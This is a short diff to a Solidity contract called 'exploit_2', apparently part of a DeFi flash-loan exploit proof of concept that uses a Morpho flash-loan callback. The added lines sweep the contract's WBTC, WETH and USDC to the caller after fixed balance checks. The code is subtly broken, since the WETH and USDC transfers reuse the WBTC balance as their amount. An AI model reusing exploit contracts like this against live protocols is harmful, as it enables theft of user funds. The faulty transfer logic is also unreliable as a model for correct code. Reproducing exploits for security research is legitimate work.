@@ -163,8 +163,10 @@ contract exploit_2{
         require(IERC20(wbtc).balanceOf(address(this))==40264081);
         require(IERC20(weth).balanceOf(address(this))==10000413246997093659);
         require(IERC20(usdc).balanceOf(address(this))==0);
-
-
+            
+        IERC20(wbtc).transfer(msg.sender, IERC20(wbtc).balanceOf(address(this)));
+        IERC20(weth).transfer(msg.sender, IERC20(wbtc).balanceOf(address(this)));
+        IERC20(usdc).transfer(msg.sender, IERC20(wbtc).balanceOf(address(this)));
     }
     
     function onMorphoFlashLoan(uint256 amount, bytes memory data) public{ 
